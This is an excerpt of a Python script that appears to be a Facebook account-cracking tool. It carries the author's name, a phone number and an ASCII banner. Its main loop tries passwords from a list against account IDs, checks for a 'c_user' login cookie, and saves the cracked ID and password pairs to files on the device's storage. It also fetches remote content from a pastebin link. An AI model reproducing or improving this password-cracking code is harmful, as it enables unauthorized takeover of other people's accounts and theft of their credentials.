...
os.system('am start https://www.facebook.com/profile.php?id=100009532563160')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100009532563160")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/xMJSG3Km").text
...
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
  ...
  AUTHOR   :   Ali Almsalate
  FACEBOOK :   Ali Almsalate
  GITHUB    :   #####
  FB GROUP  : Ali Almsalate0001
 phone number: 0944515783                           
\033[1;91m=========================================================="""
...
def xyz():
    ...
    os.system("clear");
    print(logo)
    print('           \x1b[97m[\033[37;41m Ali Almsalate  \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  Ali Almsalate   \033[0;m]")
    print(f"")
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Ali -OK😁🤘🏻.txt', 'a').write(cid + ' | ' + ps + '\n')
                oks.append(cid)
                break
                ...
                print(
                    f'\r{Red}[×]--------------------[Ali-CP😥🥺]---------------------[×]\nNUMBER : ' + uid + '\nUID   : ' + cid + ' √ ' + ps + '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/Ali-CP😥🥺.txt', 'a').write(cid + ' | ' + ps + '\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/Ali-2F.txt', 'a').write(cid + ' | ' + ps + '\n')
                twf.append(cid)
            else:
                continue
        loop += 1
        sys.stdout.write(f'\r\33[1;37m[Ali ] [%s]\33[1;97m [OK:%s~CP:%s]' % (loop, len(oks), len(cps))),
        sys.stdout.flush()
        checks(oks, cps, twf)
    except:
        pass
